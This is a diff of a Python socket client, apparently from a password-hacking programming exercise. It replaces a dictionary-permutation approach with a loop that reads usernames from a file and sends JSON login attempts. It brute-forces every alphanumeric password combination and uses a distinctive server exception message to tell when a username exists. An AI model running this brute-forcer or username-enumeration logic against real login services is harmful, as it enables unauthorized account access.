@@ -2,6 +2,7 @@
 import sys
 import socket
 import itertools
+import json
 
 args = sys.argv
 
@@ -49,47 +50,41 @@ def generate_combinations(string):
 
 
 def main():
-	# passwords = []
-	flag = 0
+	passwords = []
+	logins = []
+	password_flag = 0
+	login_flag = 0
 	new_socket = socket_connect()
-	# with open("passwords.txt", "r", encoding="utf-8") as password_file:
-	# 	for line in password_file:
-			# passwords.append(line.rstrip("\n"))
-	for password in passwords:
-		#password = line.rstrip("\n")
-		next_permutation = generate_combinations(password)
-		for item in next_permutation:
-			send_message(new_socket, item)
-			response = new_socket.recv(1024).decode()
-			if response == "Connection success!":
-				if response == "Connection success!":
-					flag = 1
-					print(item)
+	alphanumeric = generate_alphanumeric_list()
+
+	with open("logins.txt", "r") as login_file:
+		logins = login_file.read().split("\n")
+
+	for login in logins:
+		for x in range(1, len(alphanumeric) + 1):
+			for item in itertools.combinations_with_replacement(alphanumeric, x):
+				password = "".join(item)
+
+				message = {"login": login, "password": password}
+				json_message = json.dumps(message)
+				send_message(new_socket, json_message)
+				response = new_socket.recv(1024).decode()
+				json_response = json.loads(response)
+				if json_response["result"] == "Connection success!":
+					password_flag = 1
+					print(json_message)
 					break
-		if flag:
-			break
+				elif json_response["result"] == "Exception happened during " \
+												"login":
+					login_flag = 1
+
+			if password_flag:
+				break
 
 	new_socket.close()
-	# passwords.append(password_file.readline())
-	# print(passwords)
-	# new_socket = socket_connect()
-	# flag = 0
-	# alphanumeric = generate_alphanumeric_list()
-	#
-	# for x in range(1, len(alphanumeric) + 1):
-	#     # password_gen = itertools.combinations_with_replacement(alphanumeric, x)
-	#     for item in itertools.combinations_with_replacement(alphanumeric, x):
-	#         password = "".join(item)
-	#         send_message(new_socket, password)
-	#         response = new_socket.recv(1024).decode()
-	#         if response == "Connection success!":
-	#             flag = 1
-	#             print(password)
-	#             break
-	#     if flag:
-	#         break
-	#
-	# new_socket.close()
 
 
 main()
+'
+
+
